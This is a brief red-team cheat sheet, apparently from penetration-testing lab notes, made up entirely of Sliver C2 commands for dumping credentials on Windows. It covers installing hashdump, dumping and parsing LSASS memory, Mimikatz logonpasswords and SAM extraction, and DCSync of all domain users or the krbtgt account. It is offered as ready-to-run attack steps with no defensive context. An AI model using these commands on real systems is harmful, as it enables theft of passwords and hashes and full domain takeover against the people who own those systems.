Dumping Hashes
```bash
# hashdump
sliver> armory install hashdump          # install 
sliver> hashdump [flags] [arguments...]

# Dump LSASS via procdump (if hashdump fails)
sliver> ps -e lsass 
sliver> procdump --pid <pid> --save /tmp/lsass.dmp
pypykatz lsa minidump /tmp/lsass.dmp  # Dump creds locally

# Mimikatz
sliver > mimikatz -- '"arg1" "arg2"...'   # Sytax
sliver > mimikatz -- '"sekurlsa::logonpasswords" "lsadump::sam"' # example

# DCSYNC All Users
sliver > mimikatz -- '"lsadump::dcsync /domain:<fqdn> /all" "exit"'

# DCSYNC One User Example
sliver > mimikatz -- '"lsadump::dcsync /domain:<fqdn> /user:CN=krbtgt,CN=Users,DC=sde,DC=inlanefreight,DC=local" "exit"'
```

